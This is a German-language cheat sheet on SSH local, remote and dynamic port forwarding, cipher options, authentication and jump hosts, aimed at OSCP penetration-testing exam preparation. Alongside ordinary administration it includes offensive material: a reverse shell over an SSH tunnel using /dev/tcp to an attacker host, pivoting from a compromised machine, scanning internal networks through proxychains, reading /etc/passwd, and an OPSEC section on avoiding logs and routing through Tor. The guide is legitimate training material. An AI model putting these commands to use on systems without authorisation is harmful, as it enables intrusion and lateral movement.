# SSH - Port Forwarding & Ciphers Guide

## Was ist SSH?

Secure Shell (SSH) - Verschlüsselte Netzwerk-Protokoll für sichere Verbindungen. Essenziell für:
- Remote Shell Access
- Port Forwarding / Tunneling
- File Transfer (SCP/SFTP)
- Pivoting in Netzwerken

---

## Installation & Basics

```bash
# Kali (pre-installed)
ssh -V

# Server starten (Kali)
sudo systemctl start ssh
sudo systemctl enable ssh

# Windows 10+ (OpenSSH Client)
ssh -V
# Oder installieren: Settings → Apps → Optional Features → OpenSSH Client
```

---

## Port Forwarding (Tunneling)

### Local Port Forwarding (-L)

**Traffic von lokalem Port zu Remote-Ziel forwarden**

```bash
# Syntax
ssh -L [LOCAL_BIND:]LOCAL_PORT:TARGET_HOST:TARGET_PORT user@SSH_SERVER

# Beispiel: MySQL-Server über Jump Host
ssh -L 3306:192.168.1.100:3306 user@jumphost.com
# Dann: mysql -h 127.0.0.1 -P 3306

# Auf allen Interfaces binden
ssh -L 0.0.0.0:8080:internal-web:80 user@jumphost

# Mehrere Forwards
ssh -L 3306:db:3306 -L 80:web:80 -L 445:dc:445 user@jumphost

# Ohne Shell (nur Tunnel)
ssh -L 8080:target:80 user@jumphost -N

# Background
ssh -L 8080:target:80 user@jumphost -N -f
```

#### Use Cases - Local Forward

```bash
# 1. RDP über SSH Tunnel
ssh -L 3389:windows-server:3389 user@jumphost -N
xfreerdp /v:localhost:3389 /u:administrator

# 2. MySQL/MSSQL Database Access
ssh -L 3306:mysql-server:3306 user@jumphost -N
mysql -h 127.0.0.1 -P 3306 -u root -p

# 3. Internal Web Application
ssh -L 8080:internal-webapp:80 user@jumphost -N
firefox http://localhost:8080

# 4. SMB über Tunnel
ssh -L 445:dc:445 user@jumphost -N
smbclient //localhost/C$ -U administrator
```

### Remote Port Forwarding (-R)

**Traffic vom Remote-Server zum lokalen/anderen Ziel forwarden**

```bash
# Syntax
ssh -R [REMOTE_BIND:]REMOTE_PORT:TARGET_HOST:TARGET_PORT user@SSH_SERVER

# Beispiel: Kali Port 8080 → Internal Webserver
ssh -R 8080:192.168.100.50:80 user@kali-ip

# Auf allen Interfaces binden (benötigt GatewayPorts yes)
ssh -R 0.0.0.0:9999:internal-db:3306 user@kali-ip

# Mehrere Reverse Forwards
ssh -R 8080:web:80 -R 3389:rdp-server:3389 user@kali

# Ohne Shell
ssh -R 8080:target:80 user@kali -N

# Background
ssh -R 8080:target:80 user@kali -N -f
```

#### GatewayPorts für Remote Forward

```bash
# Auf SSH-Server (Kali): /etc/ssh/sshd_config
GatewayPorts yes
# Oder
GatewayPorts clientspecified

# Restart SSH
sudo systemctl restart sshd

# Dann funktioniert:
ssh -R 0.0.0.0:9999:target:80 user@kali
```

#### Use Cases - Remote Forward

```bash
# 1. Reverse Pivot (Target → Kali)
# Windows-Box hat Zugriff auf internes Netz
ssh -R 0.0.0.0:9999:internal-server:3306 kali@kali-ip
# Auf Kali: mysql -h 127.0.0.1 -P 9999

# 2. Expose local service to remote
ssh -R 8080:localhost:80 user@remote-server
# Remote-Server kann auf localhost:8080 → dein Port 80 zugreifen

# 3. Reverse Shell über SSH (alternative zu nc)
ssh -R 4444:localhost:4444 user@attacker-ip -N
# Attacker: nc -lvnp 4444
# Target: bash -i >& /dev/tcp/localhost/4444 0>&1
```

### Dynamic Port Forwarding (-D)

**SOCKS Proxy erstellen**

```bash
# Syntax
ssh -D [LOCAL_BIND:]LOCAL_PORT user@SSH_SERVER

# SOCKS Proxy auf localhost:1080
ssh -D 1080 user@jumphost

# Auf allen Interfaces
ssh -D 0.0.0.0:1080 user@jumphost

# Ohne Shell
ssh -D 1080 user@jumphost -N

# Background
ssh -D 1080 user@jumphost -N -f
```

#### SOCKS Proxy verwenden

```bash
# 1. proxychains konfigurieren
sudo nano /etc/proxychains4.conf
# Letzte Zeile:
socks5 127.0.0.1 1080

# 2. Tools über Proxy nutzen
proxychains nmap -sT -Pn 192.168.100.0/24
proxychains firefox
proxychains curl http://internal-website
proxychains sqlmap -u "http://internal-db/..."

# 3. Browser (Firefox) konfigurieren
# Settings → Network → Manual Proxy
# SOCKS Host: 127.0.0.1, Port: 1080, SOCKS v5

# 4. SSH über SOCKS
ssh -o ProxyCommand='nc -x localhost:1080 %h %p' user@internal-target
```

### Kombinierte Forwards

```bash
# Multiple Tunnels gleichzeitig
ssh user@jumphost \
  -L 3306:db1:3306 \
  -L 3307:db2:3306 \
  -L 8080:web:80 \
  -R 9999:attacker:80 \
  -D 1080 \
  -N

# Mit Config-File
cat >> ~/.ssh/config <<EOF
Host pivot
    HostName jumphost.com
    User user
    LocalForward 3306 db:3306
    LocalForward 8080 web:80
    RemoteForward 9999 localhost:80
    DynamicForward 1080
EOF

ssh pivot -N
```

---

## Ciphers & Algorithms

### Cipher auflisten

```bash
# Unterstützte Ciphers (lokal)
ssh -Q cipher

# Unterstützte MACs
ssh -Q mac

# Key Exchange Algorithms
ssh -Q kex

# Key Types
ssh -Q key
```

### Server Ciphers enumieren

```bash
# Via nmap
nmap --script ssh2-enum-algos -p22 target-ip

# Via ssh verbose
ssh -vv target-ip 2>&1 | grep "kex_algorithms\|host_key_algorithms\|ciphers\|macs"
```

### Spezifische Ciphers verwenden

```bash
# Single Cipher
ssh -c aes256-ctr user@target

# Multiple Ciphers (Komma-getrennt)
ssh -c aes256-ctr,aes192-ctr,aes128-ctr user@target

# Cipher + MAC + KEX
ssh -c aes256-gcm@openssh.com \
    -m hmac-sha2-256 \
    -oKexAlgorithms=diffie-hellman-group16-sha512 \
    user@target
```

### Legacy/Weak Ciphers (alte Systeme)

```bash
# Für alte Systeme (SSH-1 oder sehr alte SSH-2)
ssh -c aes128-cbc user@legacy-system

# CBC Mode (veraltet, aber manchmal nötig)
ssh -c 3des-cbc user@old-router
ssh -c aes256-cbc user@old-switch

# Alte Key Exchange
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 user@old-system

# Alte Host Key Algorithms
ssh -oHostKeyAlgorithms=+ssh-rsa user@old-system
ssh -oHostKeyAlgorithms=+ssh-dss user@very-old-system

# Alle zusammen (maximale Kompatibilität)
ssh -c aes128-cbc \
    -oKexAlgorithms=+diffie-hellman-group1-sha1 \
    -oHostKeyAlgorithms=+ssh-rsa,ssh-dss \
    -m hmac-sha1 \
    user@ancient-system
```

### Cipher Troubleshooting

```bash
# Problem: "no matching cipher found"
# Lösung 1: Liste Server-Ciphers
nmap --script ssh2-enum-algos -p22 target

# Lösung 2: Füge Cipher hinzu
ssh -c aes256-cbc user@target

# Lösung 3: OpenSSH Legacy Support
ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa user@target

# Problem: "no matching key exchange method found"
ssh -oKexAlgorithms=+diffie-hellman-group14-sha1 user@target

# Problem: "no matching MAC found"
ssh -m hmac-sha2-256 user@target
```

### Moderne vs. Legacy Ciphers

```bash
# Moderne (empfohlen)
aes256-gcm@openssh.com
chacha20-poly1305@openssh.com
aes256-ctr
aes192-ctr
aes128-ctr

# Legacy (schwach, aber manchmal nötig)
aes256-cbc  # CBC mode
aes128-cbc
3des-cbc    # Triple DES
arcfour     # RC4 (sehr schwach!)
blowfish-cbc
```

---

## Authentifizierung

### Password

```bash
# Standard
ssh user@target

# Passwort im Command (unsicher!)
sshpass -p 'password' ssh user@target

# Aus Environment
export SSHPASS='password'
sshpass -e ssh user@target

# Aus File
echo 'password' > /tmp/pass
sshpass -f /tmp/pass ssh user@target
```

### Private Key

```bash
# Standard (~/.ssh/id_rsa)
ssh user@target

# Spezifischer Key
ssh -i /path/to/private_key user@target

# Mit Passphrase
ssh -i encrypted_key user@target
# Passphrase eingeben

# Key Permissions (wichtig!)
chmod 600 private_key
ssh -i private_key user@target
```

### SSH Key generieren

```bash
# RSA (klassisch)
ssh-keygen -t rsa -b 4096 -f my_key

# Ed25519 (modern, empfohlen)
ssh-keygen -t ed25519 -f my_key

# ECDSA
ssh-keygen -t ecdsa -b 521 -f my_key

# Ohne Passphrase (für Scripts)
ssh-keygen -t ed25519 -f my_key -N ''

# Public Key deployen
ssh-copy-id -i my_key.pub user@target
# Oder manuell:
cat my_key.pub | ssh user@target 'cat >> ~/.ssh/authorized_keys'
```

---

## Wichtige SSH Optionen

### Connection Options

```bash
-p PORT                     # Port (default 22)
-l USER                     # Username
-i KEYFILE                  # Private key
-v, -vv, -vvv              # Verbosity level
-4, -6                      # Force IPv4/IPv6
-C                          # Compression
-N                          # No shell (tunnel only)
-f                          # Background
-T                          # No PTY allocation
-t                          # Force PTY allocation
-A                          # Agent forwarding
-X                          # X11 forwarding
-Y                          # Trusted X11 forwarding
```

### Config Options (-o)

```bash
# Wichtigste Optionen
-o StrictHostKeyChecking=no          # Ignore host key verification
-o UserKnownHostsFile=/dev/null      # Don't save to known_hosts
-o ConnectTimeout=10                 # Connection timeout
-o ServerAliveInterval=60            # Keepalive interval
-o ServerAliveCountMax=3             # Max keepalive messages
-o PasswordAuthentication=yes/no     # Password auth
-o PubkeyAuthentication=yes/no       # Pubkey auth
-o PreferredAuthentications=password # Auth method order
-o LogLevel=ERROR                    # Reduce output

# Kombiniert (stealth connect)
ssh -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o LogLevel=ERROR \
    user@target
```

---

## Jump Hosts & Multi-Hop

### ProxyJump (OpenSSH 7.3+)

```bash
# Single Jump
ssh -J jumphost user@target

# Mit User & Port
ssh -J user@jumphost:2222 user@target

# Multiple Jumps
ssh -J jump1,jump2,jump3 user@target

# Mit Port Forwarding
ssh -J jumphost -L 3306:db:3306 user@target -N
```

### ProxyCommand (Legacy)

```bash
# Via nc
ssh -o ProxyCommand='nc -x jumphost:22 %h %p' user@target

# Via SSH
ssh -o ProxyCommand='ssh -W %h:%p jumphost' user@target

# Mit SOCKS Proxy
ssh -o ProxyCommand='nc -X 5 -x localhost:1080 %h %p' user@target
```

### SSH Config für Jump Hosts

```bash
# ~/.ssh/config
Host jump
    HostName jumphost.com
    User jumpuser
    Port 22

Host target
    HostName 192.168.100.50
    User targetuser
    ProxyJump jump

Host internal-*
    ProxyJump jump
    User admin

# Dann einfach:
ssh target
ssh internal-web
```

---

## Praktische OSCP-Workflows

### Workflow 1: RDP über SSH Tunnel

```bash
# 1. SSH Tunnel erstellen
ssh -L 3389:windows-target:3389 user@jumphost -N -f

# 2. RDP verbinden
xfreerdp /v:localhost:3389 /u:administrator /p:password
```

### Workflow 2: Reverse Pivot

```bash
# Szenario: Kompromittierte Windows-Box → Internes Netz

# 1. Auf Kali: GatewayPorts aktivieren
sudo nano /etc/ssh/sshd_config
# GatewayPorts yes
sudo systemctl restart sshd

# 2. Auf Windows: Reverse Forward
ssh -R 0.0.0.0:9999:internal-db:3306 kali@kali-ip -N

# 3. Auf Kali: Tools verwenden
mysql -h 127.0.0.1 -P 9999 -u root -p
sqlmap -u "http://127.0.0.1:9999/..."
```

### Workflow 3: SOCKS Proxy für Nmap

```bash
# 1. SOCKS Proxy
ssh -D 1080 user@jumphost -N -f

# 2. proxychains config
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# 3. Scan durch Proxy
proxychains nmap -sT -Pn 192.168.100.0/24
proxychains nmap -sT -Pn -p80,443 internal-web
```

### Workflow 4: Multi-Hop Database Access

```bash
# Kali → Jump1 → Jump2 → Database

# Option 1: ProxyJump
ssh -J jump1,jump2 -L 3306:localhost:3306 db-server -N

# Option 2: Nested Tunnels
# Terminal 1:
ssh -L 2222:jump2:22 user@jump1 -N

# Terminal 2:
ssh -p 2222 -L 3306:db:3306 user@localhost -N

# Terminal 3:
mysql -h 127.0.0.1 -P 3306
```

---

## Remote Command Execution

```bash
# Single Command
ssh user@target "whoami"

# Multiple Commands
ssh user@target "whoami; id; hostname"

# Command mit Output in File
ssh user@target "cat /etc/passwd" > passwd.txt

# Background Process
ssh user@target "nohup /tmp/reverse_shell &"

# Interactive Shell nach Command
ssh user@target -t "sudo su -"
```

---

## SSH Escapes (während aktiver Session)

```bash
# Enter drücken, dann:
~.    # Disconnect
~^Z   # Suspend SSH (bg/fg zum fortsetzen)
~#    # List forwarded connections
~C    # Command line (add/remove port forwards)
~?    # Help

# Beispiel: Port Forward on-the-fly hinzufügen
~C
-L 8080:internal-web:80
```

---

## Troubleshooting

### Connection Problems

```bash
# Verbose Debug
ssh -vvv user@target

# Timeout erhöhen
ssh -o ConnectTimeout=30 user@target

# Specific Port
ssh -p 2222 user@target

# Firewall/Proxy Test
nc -zv target 22
telnet target 22
```

### Permission Denied

```bash
# Check Key Permissions
chmod 600 private_key

# Try Password Auth
ssh -o PubkeyAuthentication=no user@target

# Try Different Auth Method
ssh -o PreferredAuthentications=keyboard-interactive user@target
```

### Host Key Verification Failed

```bash
# Remove old key
ssh-keygen -R target-ip

# Ignore verification (unsicher!)
ssh -o StrictHostKeyChecking=no user@target

# Don't save to known_hosts
ssh -o UserKnownHostsFile=/dev/null user@target
```

### Tunnel/Forward Issues

```bash
# Check if Port is listening
netstat -tulpn | grep PORT
ss -tulpn | grep PORT

# Test Local Forward
ssh -L 8080:target:80 user@jumphost -N -v
curl http://localhost:8080

# Test Remote Forward (auf Server)
netstat -tulpn | grep PORT

# GatewayPorts Problem
# Auf Server: /etc/ssh/sshd_config
GatewayPorts yes
```

---

## OPSEC & Stealth

```bash
# Minimale Logs
ssh -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o LogLevel=ERROR \
    user@target

# No Banner
ssh -o LogLevel=QUIET user@target

# Via Tor
torify ssh user@target
# Oder
ssh -o ProxyCommand='nc -x localhost:9050 %h %p' user@target
```

---

## Quick Reference

### Port Forwarding
```bash
# Local
ssh -L LOCAL_PORT:TARGET:TARGET_PORT user@SSH_SERVER -N

# Remote
ssh -R REMOTE_PORT:TARGET:TARGET_PORT user@SSH_SERVER -N

# Dynamic (SOCKS)
ssh -D LOCAL_PORT user@SSH_SERVER -N

# ProxyJump
ssh -J jumphost user@target
```

### Ciphers für Legacy-Systeme
```bash
ssh -c aes128-cbc \
    -oKexAlgorithms=+diffie-hellman-group1-sha1 \
    -oHostKeyAlgorithms=+ssh-rsa \
    user@old-system
```

### Wichtigste Flags
```bash
-L    # Local forward
-R    # Remote forward
-D    # Dynamic forward
-J    # ProxyJump
-N    # No shell
-f    # Background
-v    # Verbose
-p    # Port
-i    # Private key
-C    # Compression
```

---

## OSCP Exam Tips

1. **GatewayPorts auf Kali aktivieren** - Für Remote Forwards essentiell
2. **-N flag verwenden** - Nur Tunnel, keine Shell
3. **Background mit -f** - Tunnel läuft weiter
4. **ProxyJump für Multi-Hop** - Einfacher als nested tunnels
5. **SOCKS + proxychains** - Für vollständigen Netzwerk-Zugriff
6. **Legacy Ciphers kennen** - `-c aes128-cbc` für alte Systeme
7. **sshpass für Scripts** - Automatisierte Authentifizierung
8. **SSH Config nutzen** - Spart Zeit im Exam

---

## Resources

- OpenSSH Manual: https://www.openssh.com/manual.html
- HackTricks: https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding
- SSH Audit Tool: https://github.com/jtesta/ssh-audit
